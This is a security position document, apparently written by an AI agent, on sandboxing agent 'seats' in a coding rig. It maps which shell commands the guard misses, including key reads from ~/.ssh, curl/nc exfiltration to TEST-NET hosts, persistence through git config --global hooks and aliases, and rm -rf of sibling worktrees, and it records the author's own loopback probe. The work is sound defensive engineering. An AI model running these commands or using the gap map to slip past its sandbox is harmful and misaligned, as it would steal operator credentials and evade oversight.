# Security position: the seat sandboxing substrate (ROADMAP 170–174, 268–270)

Item **#4829** (security, pm-registered; operator directive 2026-11-05: seat sandboxing is the current priority and
this row is its gate). Written **before code**, per ROADMAP 171 and `docs/runbooks/security-trust-boundary-review.md`.
No control is proposed here that I could not name a failing probe for; no claim about this tree is copied from a
delegate report — every line reference and verdict below was produced by me in this tree.

**Tree the measurements ran in:** worktree `/home/chexxor/Git/Durian-Pi/item-4829`, branch `item-4829`, HEAD
`294e1806fd21` (main tip at workspace preparation). Artifact set: **80 packages, no `vendor/pi-main`** (deps come
from the lockfile: `@earendil-works/pi-durable` 1.3.0). The probes below import only `src/` modules plus that
package, so they run in this set; a verdict that needs the deps-linked 187-package set is labelled as such.
Host: Fedora 44, node v24.22.1 (D131: Linux is the rig's operating system). **Re-measured 2026-11-06T02:38Z in the
same branch, tip `96f810f1` (main tip then `fca4e980`)** — the substrate probes in *Re-runnable probes* and G5(b) were
re-run at that tree, not at `294e1806fd21`.

**Shell datum, read from the product's own registry rather than inferred from a PATH list** (`node -e
'import("./src/shellregistry.mjs").then(m=>{const s=m.seatShellSelection; …})'`, exit **0**):
`{platform:"linux", name:"bash", degraded:false, programs:["bash"], startedBy:"/usr/bin/bash"}`. `pwsh` and
`powershell` are absent on this host, and that absence is a **program-list fact, not a verdict**: the seat shell that
actually starts here is `bash`. Stating the absence without the selection is what invites the inference that no shell
starts — see **G11**, which refutes exactly that inference in a live instrument.

**Secret scan first, per the runbook.** Class-pattern scan over the tracked tree, sanctioned carriers excluded
(`docs/runbooks/leaked-secret.md:101`), exit **1 = clean**. No value is quoted anywhere in this document; the
credential discussion is by name and location only.

**Governing environment fact (D-ENV-AUTH, unchanged):** every seat runs as the **same single OS user**
(`chexxor`). OS identity is therefore a **norm, not a control**. Every control this position specifies is
app-layer-plus-OS-substrate and falsifiable by a check that can run and fail. Corollary, stated plainly: on this
box, anything readable by that user is readable by every seat, and anything writable by that user is writable by
any seat that reaches it by a path the guard does not inspect.

---

## Scope

**The boundary.** Every effect a seat-initiated action has on anything **outside the seat's own run**: the
filesystem, the network, other principals' files (the operator's dotfiles, sibling seats' worktrees), the
git/npm toolchains as persistence surfaces, the store, and the provider surface. Subject = the seat's *process
tree for one claim*, not the seat's name.

**What listens today (measured, with what each actually enforces):**

| Layer | Where | What it enforces | What it does **not** reach |
| --- | --- | --- | --- |
| `beforeTool` hook (extension `durig.guard`) | `src/seatguard.mjs:464-472`, `:528-531` | command-text deny rules, degraded-cwd refusal, spool-path refusal, out-of-worktree **write targets**, staged-commit secret gate | anything that is not a tool call: child processes, the child's own syscalls |
| command deny rules | `src/confine.mjs:203-311` (`DENIED_COMMANDS`) | `wsl`, `docker`, state-mutating git (`reset/checkout/switch/clean/…`), unscoped staging, `push` without the operator grant, `-C` redirects of the same | **no network client at all** — `grep -rn "curl\|wget\|\bnc\b\|netcat" src/confine.mjs src/seatguard.mjs` → no match |
| write-target resolver | `src/writetargets.mjs` (header: "a HEURISTIC OVER A STRING") | redirect targets, PowerShell cmdlet path params, `cp/copy/mv/move/xcopy/robocopy` destinations, `cd` tracking | POSIX writers (`rm`, `sed -i`, `chmod`, `ln`, `dd`, `tee`), git config targets, computed paths — and these are **not reported as `unresolved`** (see F1) |
| `unresolved` reporting | `src/seatguard.mjs:468-472` | prints to stderr "they were NOT checked" | does **not** block |
| fs/tool-method confinement (SC1–SC3) | `src/confine.mjs:491-493` (`confinedEnv`), `:680-694` (`exec`) | path methods wrapped to the seat root (+ read-only roots); mutations refused for a read-only seat; `inheritEnv: false` **forced**, `env = pickEnv(…, ENV_ALLOWLIST)` | the shell's own file operations inside the child (only the child's *cwd* is pinned) |
| env allowlist | `src/confine.mjs:340-353` (12 OS-runtime names), `:364-365` (`SECRET_NAME`), `:370-378` (`pickEnv`) | a credential-**named** variable never crosses, whatever the caller asks | a credential-**valued** variable under an allowlisted name; `HOME` crossing is what makes `~/.ssh` reachable (F2) |
| per-seat tool scoping | `src/seattools.mjs:241-276` (`VERIFIER_REMOVALS`, `COORDINATOR_REMOVALS`, `toolRemovalsFor`) | capability-declared removals; a seat declaring nothing loses every working tool | the OS: `seattools.mjs:245-247` says it itself — "a shell writes whatever the OS user can write however few tools it is offered" |
| fail-closed env choice | `src/seattools.mjs:303-311` (`makeSeatEnv`) | an unknown conversation gets the **read-only** env, never an unconfined one | — |
| result redaction | `src/secretredact.mjs` via `afterTool` (`src/seatguard.mjs:530`) | secret-shaped values in tool **results** | output a seat sends somewhere else (network, a file outside the tree) |

**Baseline verdicts I measured today** (in-process evaluation of `refusalFor` + `beforeTool`; **no command was
executed**; probe at the end of this document, exit **0**). `ALLOW` = the call would have run.

| Shape | confine | hook |
| --- | --- | --- |
| HTTP PUT of a worktree file to a foreign host | ALLOW | ALLOW |
| raw TCP to a LAN host:port, file on stdin | ALLOW | ALLOW |
| `python3 -c` socket to a foreign/loopback address (incl. the rig's own inference port) | ALLOW | ALLOW |
| outbound `ssh` to a foreign host | ALLOW | ALLOW |
| `cat ~/.ssh/id_ed25519`; `tar -c ~/.ssh \| base64` | ALLOW | ALLOW |
| `cat /etc/passwd`; `cat ../item-<other>/src/confine.mjs` (sibling seat's tree) | ALLOW | ALLOW |
| `git config --global core.hooksPath <dir outside the root>` | ALLOW | ALLOW — **and `writeTargets` returns `targets:[] unresolved:[]`** |
| `git config --global alias.x '!<command>'`; `include.path`; `credential.helper store` | ALLOW | ALLOW, same silent-empty resolver result |
| `rm -rf <absolute path to a sibling worktree>` | ALLOW | ALLOW, `targets:[] unresolved:[]` |
| `sed -i` on `$HOME/.bashrc`; `chmod 666 ~/.ssh/authorized_keys`; `ln -s <outside> <link>`; `git -C <other checkout> commit` | ALLOW | ALLOW |
| `npm install` with lifecycle scripts enabled | ALLOW | ALLOW |
| control: `echo x >> ~/.bashrc` (redirect target outside root) | ALLOW | **BLOCK** (resolver caught it) |
| control: `cp <file> /tmp/…` | ALLOW | **BLOCK** (resolver caught it) |
| control: `docker ps` | **BLOCK** | **BLOCK** |
| control: `git push origin main` without the grant; inline `DURIG_ALLOW_PUSH=1` forgery | — | **BLOCK** (both names, `bash` and `powershell`) |

Read the table as the position's spine: the guard is a **text matcher over one tool call** that resolves **some**
write targets; anything the child process does by itself — reading, deleting outside via a verb the resolver does
not know, persisting into a config file outside the tree, opening a socket, running a lifecycle script — is
**unmediated**, and nothing about that decision is recorded anywhere.

---

## Threat model

Threat → control that would answer it → the probe that shows it failing. Probes are commands that can run and go
red, not assertions.

| # | Threat (actor = a seat, willing or tricked by injected content) | Today | Proposed control | Falsification probe |
| --- | --- | --- | --- | --- |
| T1 | **Credential-adjacent reach:** read the operator's private key material / any file that user can read, then send it | measured ALLOW | OS path rules at spawn (174: Landlock/read-deny or a per-run `HOME`), plus a **read** rule set, not only a write one | seat shell reads a fixture key under a path outside the root: **passes today, must be blocked after**; assert the block is recorded |
| T2 | **Egress:** any host/port this box can reach, incl. LAN and the rig's own loopback gateway port (`docs/NEXT.md:146-152`, `0.0.0.0:47832`, firewalld runtime-only) | measured ALLOW at both layers | deny-by-default destination policy as **data per claim** (268 + 173), enforced by a network namespace / Landlock TCP rules; the report's Windows caveat (advisory without elevation) recorded as residual | (a) connect to a loopback port the claim was not granted; (b) connect to a TEST-NET/LAN address — both **must** be refused and each refusal queryable |
| T3 | **Persistence + later code execution at the operator's identity** via `git config --global core.hooksPath` / `alias.x '!…'` / `include.path` / `core.fsmonitor` — writes **outside** the worktree without naming a path, so the resolver never sees it, and a *later* git run (including the operator's landing pass) executes it | measured ALLOW, resolver silent | app-layer belt now: treat a mutating git config form that names `--global`/`--system` as an unresolvable write target (so the existing "NOT checked" path fires) and refuse it; durable answer = the spawn wrapper's write rules (174) + `GIT_CONFIG_GLOBAL`/`GIT_CONFIG_SYSTEM` pinned per run at the spawn seam | the six global-config forms above: **ALLOW today → BLOCK after**, each with a named rule id in the record; plus an end-to-end fixture: install the alias in a fixture `HOME`, run `git <alias>`, assert it never executes |
| T4 | **Cross-seat sabotage/contamination:** destroy or edit a sibling seat's worktree (`rm -rf`, `sed -i`, `chmod`), so what a verifier signed off is not what landed | measured ALLOW | per-claim path rules incl. sibling trees denied; worktree provenance/ownership checks (the WORKTREE-ROT family) | `rm -rf <sibling>` and `sed -i <sibling file>` refused and recorded; a check rule flags a landed artifact whose tree changed outside its item's commits |
| T5 | **Escape by indirection:** lifecycle scripts, `node -e`, `make`, `sh -c` — the mediated surface is a *tool call*, the effect is a **process** | ALLOW by construction (report §4 lists exactly this) | the spawn wrapper (report ruling: "the smallest real boundary … is a spawn-time wrapper … with a monotonic (unwidenable) ruleset") | a fixture `npm install` whose `prepare` script writes outside the worktree / opens a socket: must fail **after** the wrapper, with the wrapper's claim set asserted equal to what it actually enforces |
| T6 | **Unaccountability:** refusals write nothing, so "which seat, which rule, when" is unanswerable; post-incident and grant decisions both have no base | measured (`{block: …}` is the whole record; `unresolved` → stderr only) | 172's `avc`-shaped durable row: subject, object, class, permission, result, enforce\|complain, `policy_rev` | two runs of the same seat distinguishable in the audit; a refused action retrievable **by subject and rule** |
| T7 | **Self-adjudicated grants:** a seat asks for reach and approves itself (the forged-stamp class, #3969/#3975) | no ask path exists yet (269) | cross-family verifier adjudicates (D48/D119 discipline); grant keyed on the identity 172 mints, with TTL, expiry and revocation in the record; capability removal is defence-in-depth, **not** authentication | (i) unanswered ask **denies**; (ii) verifier refusal leaves it denied and records the reason; (iii) forged self-approval refused; (iv) after expiry the action is refused again |
| T8 | **Monotonicity break:** a "raise" widens a live ruleset instead of spawning a new one | n/a yet | spawn-time ruleset stays monotonic (Landlock cannot be widened once applied — report [^7]); a raise = new spawn with a wider set | attempt to widen the rules of a live claim: no API path exists; the demo asserts the raise produced a **new** subject label |
| T9 | **Label staleness:** grants keyed on seat name survive `reset`/fork/compact, so a grant outlives the claim that earned it | today reach is decided once at `up` (`toolRemovalsFor`) | grant object keyed on the per-run subject label + `policy_rev` (report: labels must be **recomputed at spawn**, never cached — Landlock does not apply to files opened before the ruleset) | a grant issued in one run is refused after `reset`/fork; the audit shows the two subjects as distinct |
| T10 | **Confidence beyond the mechanism:** claiming confidentiality metadata or "no network" from a mechanism that does not deliver it (the report's Landlock caveat: `chmod/chown/access`, `/proc/<pid>/fd/*` are not restrictable) | live risk in the prose, not in code | a claims table per control: what it enforces, what it only deters | an assertion test that pairs each claim with the right syscall/shape and fails if the mechanism does not enforce it |
| T11 | **Adjacent, not in this boundary:** memory poisoning → later seat's instructions; the write gate is owned by **167 / #4827**, and no memory record may ever satisfy a permission check | out of scope here | see `#4827` | see `#4827` |

---

## The boundary, named

**171's question was "name the boundary".** My answer, and it is the load-bearing sentence of this position:

> **The boundary is the spawn seam of every seat-initiated child process** (`bash`/`git`/`npm`/anything a child
> execs), at the existing process-group/Job-Object point (`src/job-object.mjs`, per the report's enforcement
> inventory), carrying: an **OS-enforced path rule set** (read *and* write, not write-only), an **OS-enforced
> destination rule set**, a **per-run subject label** minted at spawn, and **no credential name and no
> credential value in the environment** (already true by name — `confine.mjs:364-365`).
>
> Everything else in the current stack — the `beforeTool` hook, the deny-rule text matcher, the write-target
> resolver, tool removal — is a **belt** that contains mistakes and shapes behaviour. It is **not** a boundary,
> because it runs in the subject's own process with the subject's own OS identity (the report rules this at
> `zero-trust-zero-agent-research.md:11,160`; my baseline table is the local evidence: the hook refuses a
> redirect and a `cp`, and misses a `rm`, a socket, a global git config write and a lifecycle script).
>
> Consequence for sequencing: **174's spawn wrapper is the item the word "sandbox" refers to.** 268 (egress
> rules) and 173 (policy as data) are its inputs; 172 (subject + audit) is what makes any of it answerable;
> 269 (the ask/raise cycle) sits behind all three; 270 (extension placement) bounds where their code may go and
> should land before any of them.

**Landing order I propose (pm sequences; this is advice, not a ruling):**
270 (invariant + instrument, cheapest, bounds placement) → 172 (identity + audit record; no trust boundary is
crossed, and 268/269/273's acceptance all need rows to point at) → 173 (policy as data, in **complain** mode,
writing the same rows as enforce) → 174 Linux half (spawn wrapper: Landlock + network namespace or `bwrap`,
seccomp where it adds) → 268 (egress rules per claim, with the escape probes) → 269 (ask → adjudicate →
raise-with-expiry → revoke) → 271 (prior-art reviews feeding the above) → 273 must be **armed before 269 is
built**, because a cross-family adjudicator that is dark makes 269 fail open.

---

## Per-row verdicts — what is now scopeable

| Row | Verdict | Why, and what it is scopeable **against** |
| --- | --- | --- |
| **170** | **Delivered.** | `docs/reviews/zero-trust-zero-agent-research.md` exists with the commissioned shape (gap table, adopt/reject tables, failure catalogue, platform matrix, could-not-verify list). Its §1 caveat says it was written **without the tree** — so my baseline table above is the local re-measurement it asked for, and it updates two baseline sentences (see F2 and F4). |
| **171** (the position) | **Delivered by this document.** | Four anchors present and each control carries a probe; verify runs below. |
| **172** (subject identity + audit) | **Scopeable NOW.** Highest value-per-line in the tranche. | No new trust boundary is crossed: mint a per-run label at spawn, write one durable row per decision, make it queryable. Depends only on 170/171. Today's evidence that it is missing: `{block: …}` is the whole record; `unresolved` goes to stderr (`seatguard.mjs:468-472`) and is not queryable. |
| **173** (policy as data) | **Scopeable NOW for the data shape and complain mode; NOT for enforcement.** | Labels, class table, `allow` rows, `policy_rev`, a fail-closed loader (broker refuses unparsable policy) and `policy explain` can all be built against the existing hook and tested failing-first. What cannot be done in the hook is enforcing a *path* or *destination* rule — that waits for 174. Ship it in complain mode writing the same rows as enforce (report: `permissive` is not "off"). |
| **174** (OS-level backstop) | **Scopeable NOW for the Linux half only.** Windows half is **not** scopeable. | Linux: Landlock (+ seccomp / `bwrap`) is unprivileged, self-imposed at spawn, inherited, with TCP-port rules since ABI v4 — no elevation, fits the spawn seam, and 268 supplies the escape evidence its acceptance needs. Windows: the report rejects AppContainer and notes per-principal network denial **requires elevation** (a dedicated local user at elevated setup). That is an operator decision, not an engineering step, so the Windows half is **gated on an operator ruling** and must stay registered with that gate visible. "Native Windows first" is correctly amended in the row. |
| **118** | **Supersede it; do not re-point-and-leave.** | 268 re-points it and my grep (`network\|socket\|egress` in `src/confine.mjs` → **0**) confirms 118's 2026-10-17 premise still holds. 118's acceptance is a *truthful statement in `docs/PM-ADAPTERS.md`* — carve that sentence out into 268's acceptance and cancel 118, or the queue keeps a parked duplicate of a live row. |
| **132** (API-key component) | **Beside, and it must change shape.** | The credential *non-possession* half (provider key never in a child env, broker-side credential, sentinel substitution) is now specified by this substrate's boundary, not by 132's own design. 132 stays operator-owned; 268's boundary **raises the requirement** on it. Do not let 174's spawn wrapper be read as "credentials solved". |
| **60** | **Beside** (the least-privilege half, research-consumed). | Its output is the report; nothing to build under it. Keep as the least-privilege citation anchor. |
| **268** | **INSIDE the tranche** — it is 174's egress half plus 173's rule data. | Not a sibling item. If it is sequenced separately, 174 risks shipping path rules only, which is the exact half-measure F1/F2 show is insufficient. Re-points 118 (deliberate): cancel 118, keep its documentation sentence. |
| **269** | **BESIDE, and behind.** | Inherits 172's record and 173's data; gated on 273 (cross-family verifier armed). Do **not** re-mint its grant object: the report's row for "claim-scoped grants" already specifies `(claim_id, object_label, perms, issued_by, policy_rev, expires_at)` — 269 must cite that and add only the protocol (ask/judge/raise/revoke), or we get two grant shapes with one name (the #272 failure mode). |
| **270** | **BESIDE, and it should go FIRST.** | It is the invariant that keeps 268/269/172/173's code in an installed extension (`durig.guard` at `seatguard.mjs:528-531`; `src/extensions.mjs:6-16` no auto-discovery; `:19-21` a pi *coding-agent* extension cannot load here — so "put it in a Pi extension" has a precise meaning in this tree). Cheapest row in the set; bounds every other one. |
| **271** | **Beside** (input, not build). | Prior art pinned: `sandbox-sdk @ 61cac81b` (Apache-2.0), `agent-governance-toolkit @ a918f763` (pin moved past our review), `awesome-agent-sandboxes @ db6ffc0a` (**NO LICENSE FILE** — recorded as an escalation, link-list only, nothing copied). Acceptance must include the **written rejection** of the cloud/microVM family, not silence. |
| **272 / 273** | **Beside**; 273 gates 269. | 273 (the verifier roster names a model the provider does not serve) is not a sandboxing item, but it decides whether an adjudicator exists. **269 must not be scheduled before 273 closes.** |

---

## Findings (severity, exploit path, fix — nothing flagged without all three)

**F1 · HIGH · the write-target resolver's POSIX verb coverage is empty, and its silence is not reported.**
`writeTargets` knows redirect targets, PowerShell cmdlets, and `cp/copy/mv/move/xcopy/robocopy`; on a Linux host
that is a very short list. Measured: `rm -rf <absolute sibling worktree>`, `sed -i $HOME/.bashrc`,
`chmod 666 ~/.ssh/authorized_keys`, `ln -s <outside>`, `git -C <other checkout> commit` → hook **ALLOW** with
`targets:[] unresolved:[]`, i.e. neither blocked nor reported. The module's own header states the property this
breaks ("a resolver whose silence is indistinguishable from 'nothing to check' is worse than none"), and
`seatguard.mjs:468-472` only prints for entries it *did* classify as unresolvable.
*Exploit path:* one seat shell call deletes or rewrites another seat's tree, or the operator's dotfiles, at the
shared OS identity — silently. *Fix, in the order the fix is worth doing:* (a) 174's OS path rules are the
answer; (b) the cheap belt, honouring the module's "DO NOT ADD A VERB LIST" rule, is to classify a token as a
**mutating form whose target could not be resolved** (verb in a small mutating-verb set **or** a redirect, plus a
non-target-shaped argument) and push it into `unresolved` so the existing "NOT checked" surface fires — and
172's record makes it queryable rather than stderr-only; (c) a `check` rule that runs the probe set below and
fails when a mutating form yields `targets:[] unresolved:[]`.

**F2 · HIGH · the credential half is closed for *names* and open for *reach*, and the baseline sentence is now
false.** Verified: `inheritEnv: false` is forced and a caller asking for `inheritEnv: true` is overridden
(`src/confine.mjs:686-694`); the allowlist is 12 names (`:340-353`); `SECRET_NAME` blocks credential-named
variables whatever the allowlist (`:364-365`); an unknown conversation gets the read-only env
(`src/seattools.mjs:303-311`). So ROADMAP 170–174's baseline sentence "…and, today, the parent environment's
provider key" is **wrong for a seat child** and 268's correction is right. **But** `HOME` is allowlisted, and
`cat ~/.ssh/<key>` is measured ALLOW at both layers, and egress is measured ALLOW at both layers — so the
credential surface is open *through the filesystem*, not through the environment.
*Exploit path:* read a private key (or any file that user can read) and PUT it to a host on the LAN or the
Internet; nothing in the stack refuses either half. *Fix:* (a) do not weaken the env rule — it works; (b)
pin `HOME` per run at the spawn seam to a per-claim directory and pass `GIT_CONFIG_GLOBAL`/`GIT_CONFIG_SYSTEM`
explicitly (this also kills F3's config-write channel and costs nothing); (c) add the read side to 174's rule
set; (d) as a cheap belt, run the existing value-level `looksLikeSecret` (`src/config.mjs:82-89`) over
allowlisted **values** in `pickEnv` too, so a token smuggled into a value under an allowlisted name is refused —
low severity on its own, one line, and it makes the rule name-and-value instead of name-only.

**F3 · HIGH · `git config --global …` is an unreported write outside the root and a later-execution surface.**
Measured ALLOW for `core.hooksPath`, `alias.x '!…'`, `include.path`, `credential.helper store`, with the resolver
silent (F1). The path is never spelled as an argument, so the only thing that could catch it is a rule about the
**form**.
*Exploit path:* a seat writes the operator's `~/.gitconfig`; the next git run by any seat **or by the operator's
landing pass** executes the installed hook/alias/fsmonitor at the operator's identity, outside every worktree —
persistence plus privilege movement from "seat that can write files" to "code that runs during integration".
*Fix:* refuse `git config` with `--global`/`--system` (the seat's own config is `.git/config` in its worktree,
and `git -c <key>=<value>` covers legitimate one-off needs); pin `GIT_CONFIG_GLOBAL`/`GIT_CONFIG_SYSTEM` at the
spawn seam so even a refused-form bypass attempt writes into the claim's own sandbox; add the fixture in F1's
probe set (install an alias into a fixture HOME, run it, assert it never executes).

**F4 · MEDIUM · egress is not merely absent, it is absent from the *vocabulary* of the deny layer.**
`grep -c -iE "network|socket|egress" src/confine.mjs` → **0**; `grep -rn "curl\|wget\|\bnc\b\|netcat" src/confine.mjs src/seatguard.mjs` →
no match. So 268's premise holds today. The honest severity statement, using `docs/NEXT.md:146-152` rather than
my own probing (I did **not** scan the port — that would be active egress from a seat): the rig's inference share
is bound to `0.0.0.0:47832`, `GET /v1/models` returns 401 without a bearer token and 200 with, and the firewall
rule is **runtime-only** (`--permanent --list-ports` lists neither 47832 nor 47831), so a reload or reboot
closes the LAN path again — the exposure is current but operator-owned and reversible. *Fix:* 268's
deny-by-default destination policy per claim; and the position's probe pair (loopback port not granted; LAN
address) as its acceptance, both recorded.

**F5 · MEDIUM · nothing is recorded, so nothing is judgeable.** The report's ruling stands as measured: no
`avc: denied` analogue, and the one reporting path (`unresolved`) is a stderr line that a verifier cannot query
and a grant adjudicator cannot consult. *Fix:* 172, and specifically require that the record carry
`policy_rev` and `enforce|complain`, and that a row **never** carry a secret value (redacted preview ≤ 4 leading
chars, per `docs/runbooks/leaked-secret.md`) — an audit sink is the second-most-likely place in this rig to
become a secret store.

**F6 · LOW · the redactor destroys the identifiers this position needs.** Every 40-hex value in my tool output
was rewritten as `secret-shaped value (high-entropy-token)` — git shas, patch-ids, pinned shas. That is the
already-registered checker-based-exclusion class (#2055/#2056 — #2056 cancelled-as-resolved 2026-11-07: the
requirement now lives inside its carrier **#3128**, the single writer on that predicate, per lead's #2040
ruling A; and lead's hazard row **#4922**); this run is a
second measured instance, in the *security* seat, where the redaction prevented a sha from being transcribed
into a durable position. Cited to #4922, not re-registered.

**F7 · LOW-MEDIUM, availability/integrity, and it is live now: a seat cannot re-read its own item body.**
`claim_work` for #4829 said the full text is at `/home/chexxor/Git/Durian-Pi/item-4829/.durig/4829.md`; that path
does not exist (ENOENT), and the shared root's `.durig` holds other, older item bodies and not this one. The
read-only root `confine` grants is `join(fallbackRoot, ".durig")` (`src/seattools.mjs:296-299`, #1465), so after
a rig move the store's `.durig` and the granted read-only root can be different directories. *Exploit/impact
path:* an over-threshold item body — the whole spec of a task — is unreadable, and the seat works from the
subject line alone, which is exactly how a task gets silently reinterpreted. *Fix:* resolve the item-body path
from the store the seat is served by and put **that** directory in `readOnlyRoots`; and make the claim notice
print a path that resolves inside the seat's own tree. Probe: claim an over-threshold item and `read` the named
path from inside the worktree — today ENOENT.

---

## Non-goals

- **Not** SELinux's machinery: no type-enforcement policy language, no policy compiler, no roles/MLS, and **no
  `audit2allow`-style rule synthesis** as a normal step (report ruling: `audit2allow` is the documented failure
  mode; a diffed, narrowed, **signed** proposal is the only acceptable use). We borrow the *shape*: one
  mediation point, decisions from labels, default-deny `allow` as data, and a durable record.
- **Rejected in writing, not silently** (D131 + the never-`wsl`/never-`docker` non-negotiables, which the guard
  already enforces at `confine.mjs:204-205`): **E2B, Modal, Firecracker, Kubernetes `agent-sandbox`, Docker/
  Podman, WSL, any cloud-hosted or microVM seat runner, and any "run the seat on another host" plan.** They
  break the native-host rule, they add a second writer surface, and they are not needed to get the property we
  want. `arjan/awesome-agent-sandboxes` @ `db6ffc0a` carries **no license file** — it is used as a link list
  only, nothing is copied from it; that is recorded as an escalation, not waved through.
- **Not** per-call human prompting (Android moved away from it; the report rejects it). The ask path (269) is a
  claim-scoped protocol, not an approval dialog.
- **Not** credential storage/rotation design (132 owns it; 1786 owns rotation practice). This position states a
  *requirement* on 132 (broker-side credential, never distributable), not its design.
- **Not** the memory write gate (167; position at **#4827**), and not spend caps — a budget is not a permission,
  and "raise permissions" must never quietly mean "raise caps".
- **Not** a daemon. The report rules the spawn wrapper over an always-on process; nothing here authorizes a new
  resident service, and any proposal that adds one re-opens this position.

## Gates

Numbered, falsifiable; every one is a check that can run and fail. `pm` sequences, `lead` adopts, the operator
owns host-level steps.

1. **G1 — Placement.** Before any of 268/269/172/173 ships, the invariant doc (270) names the **owning
   extension** for each control, and a `check`/probe reports the installed extension set and flags a control
   living outside one. Probe: uninstall the guard in a fixture and assert the policy is absent **and the rig
   says so** (provenance already reports the active set, `src/provenance.mjs:79-90`).
2. **G2 — Record before raise.** No adjudication row (269) may be written before 172's record exists and is
   queryable by subject and rule. Probe: retrieve a refusal by `(subject, rule_id)`.
3. **G3 — Fail closed.** An unanswered or refused ask **denies**; a policy file that does not parse stops the
   broker rather than running with none; an unknown conversation gets the read-only env (already true — keep the
   demo). Probe: the three failing-first demos from 269's acceptance.
4. **G4 — Monotonic.** A grant raise produces a **new spawn** with a wider ruleset; no API widens a live one.
   Probe: attempt to widen a live subject; assert refusal / absence of a path.
5. **G5 — Escape evidence, not prose.** The named escape set — (a) read a fixture key outside the root,
   (b) TCP to an ungranted loopback port, (c) TCP to a TEST-NET/LAN address, (d) `git config --global
   core.hooksPath <outside>`, (e) `rm -rf <sibling worktree>`, (f) an `npm` lifecycle script writing outside —
   must be demonstrated to **pass today** (my baseline table is that demonstration) and **block after**, each
   with a recorded row. Any of these that still passes means 174 did not land, whatever the docs claim.
6. **G6 — Claims ⊆ enforcement.** Each control ships a claims table, and a test asserts the claim set is not
   wider than the mechanism (Landlock does not restrict `chmod/chown/access` or `/proc/<pid>/fd/*`; a `beforeTool`
   regex does not survive `sh -c`/`node -e`). Probe: a claim with no enforcing test is a red suite.
7. **G7 — Adjudicator armed first.** 269 is not schedulable until 273 closes, because a dark cross-family
   verifier makes the ask path fail open by construction.
8. **G8 — Every control has its probe in the demo suite.** A control whose probe lives only in prose is moved to
   this position's **Residual risk** section, named — not left presented as a control.
9. **G9 — The record never carries a secret value.** Redacted preview only; the audit sink is a likely future
   secret store, so this is a gate on its schema, not a suggestion.
10. **G10 — App-layer belts stay marked as belts.** F1/F2/F3's cheap fixes (resolver `unresolved` coverage,
    `pickEnv` value-level `looksLikeSecret`, `git config --global/--system` refusal) may land **before** 174 and
    should, but each must be labelled in docs and in the record as a mistake-containment layer, so that a green
    belt demo is never cited as the boundary.
11. **G11 — A substrate verdict carries its host and its tree; a negative it cannot verify prints UNKNOWN.** A
    false "cannot" leaves a needed control unworked; a false "can" gets one skipped — both are security defects,
    because the queue and the audit read instruments rather than reasoning. Live instance at writing time, named so
    it can be re-checked: `tools/channel-preflight.mjs:468` prints the definitive **"NO SHELL CAN START HERE"** while
    `src/shellregistry.mjs:179` selects `bash` at `/usr/bin/bash` (`degraded:false`, exit 0). The instrument derives
    its program list from the pinned build default (`vendor/pi-main/packages/durable/src/tools/bash.ts:169`,
    `options?.programs ?? ["pwsh", "powershell"]`) with the same Windows pair repeated as its own fallback at
    `tools/channel-preflight.mjs:234`, and it never imports the registry —
    `grep -c -E 'shellregistry|seatShellSelection' tools/channel-preflight.mjs` → **0**, exit **1**.
    **That verdict is refuted; this position does not rest on it and must not be cited as its source.** The
    instrument fix is a CODE change owned by #5133's carrier (cause, plus a demo pinning the printed program list to
    `seatShellSelection.programs` per the reported platform, supplied in #5163) — it is **not** absorbed here. 172's
    record rows inherit the gate: a row states host + tree + date, and an unverifiable claim is recorded as UNKNOWN,
    never as a negative.

## Residual risk (named, not controls)

- Until G5 passes, the only thing between a seat and T1–T5 is text matching in the subject's own process. The
  report states it and my baseline table measures it: **this rig currently has no boundary against a seat that
  tries.**
- Windows: per-principal network denial requires an elevated setup step (a dedicated local user). Declining it is
  a legitimate operator decision, and then "no egress control on Windows" is a **recorded residual**, not an
  implied control.
- Landlock scope: metadata operations (`chmod`, `chown`, `access`) and `/proc/<pid>/fd/*` are not restrictable
  today; a `bwrap`/namespace combination buys more than Landlock alone and costs portability. Which one is chosen
  is an implementation decision the escape probes decide.
- Cross-family verification is currently dark (273); until it is armed, "a verifier judged this" is not
  available for any of these controls.
- Prompt-cache cost of any instruction-text change tied to the sandbox (tool names, shell names, grant text) is
  unmeasured (D144 family) — do not let a security fix silently become a prefill regression.

## Re-runnable probes

Baseline verdict table (evaluates the guard's decision function; executes nothing) — write to a scratch file in
the item worktree, run `node scratch-egress-probe3.mjs` (exit 0), then delete it. Case list: `cat ~/.ssh/id_ed25519`
· `cu`+`rl -T <file> http://198.51.100.7/` · `/usr/bin/nc 192.0.2.10 47832 < notes.txt` · `python3 -c
"import socket;socket.create_connection(('127.0.0.1',47832))"` · `git config --global core.hooksPath
/home/<user>/.hooks` · `git config --global alias.w '!evil'` · `rm -rf <absolute sibling worktree>` ·
`sed -i … $HOME/.bashrc` · `chmod 666 $HOME/.ssh/authorized_keys` · `wget http://198.51.100.7/p` · controls:
`echo x >> $HOME/.bashrc`, `cp <file> /tmp/`, `docker ps`, `git status`. Expected **today**: ALLOW for all but
the three controls. Expected **after 174/268**: block for the first nine, each with a queryable row (G5).

Structural verify of this position (the runbook's own check, run against this file):

```bash
git grep -cE '^## (Scope|Non-goals|Gates|Citations)' -- docs/reviews/security-seat-sandbox-position.md   # expect 4
git grep -cE '^## Threat model' -- docs/reviews/security-seat-sandbox-position.md                        # expect 1
```

Host-carrying substrate probes — re-run before citing any of these; a verdict without a host, a tree and a date is
stale by construction (G11):

```bash
node -e 'import("./src/shellregistry.mjs").then(m=>{const s=m.seatShellSelection;console.log(JSON.stringify({platform:s.platform,name:s.name,degraded:s.degraded,programs:s.programs,startedBy:s.startedBy}))})'
# this tree, 2026-11-06: exit 0, {"platform":"linux","name":"bash","degraded":false,"programs":["bash"],"startedBy":"/usr/bin/bash"}
# degraded:true is the UNKNOWN case — nothing can start, and the rig must SAY SO instead of asserting a host fact.
grep -c -E 'shellregistry|seatShellSelection' tools/channel-preflight.mjs
# 0 matches, exit 1 = the instrument still does not read the registry, so its §7 shell verdict stays refuted.
```

Seat-shell TCP reach, from a seat worktree with **no grant beyond the default** (measured 2026-11-06T02:38Z, branch
`item-4829` @`96f810f1`): `127.0.0.1:8080` → **REACHABLE** — a port this seat was never given; `127.0.0.1:47832` →
**ECONNREFUSED**, so the share named at `docs/NEXT.md:146-152` is **not listening today** and that figure is
stale-by-measurement: re-measure when asserting it, never carry it forward. Conclusion for 268: **loopback egress is
not gated by the grant** — this is G5(b)'s "passes today" half, measured rather than asserted. No LAN or TEST-NET
host was touched by this probe, so G5(c) still needs its own escape run.

## Citations

- **Measured in this tree by this seat** (exit codes named): secret class scan → 1 (clean);
  `grep -c -iE "network|socket|egress" src/confine.mjs` → **0**; egress/verdict probes → exit 0, tables above;
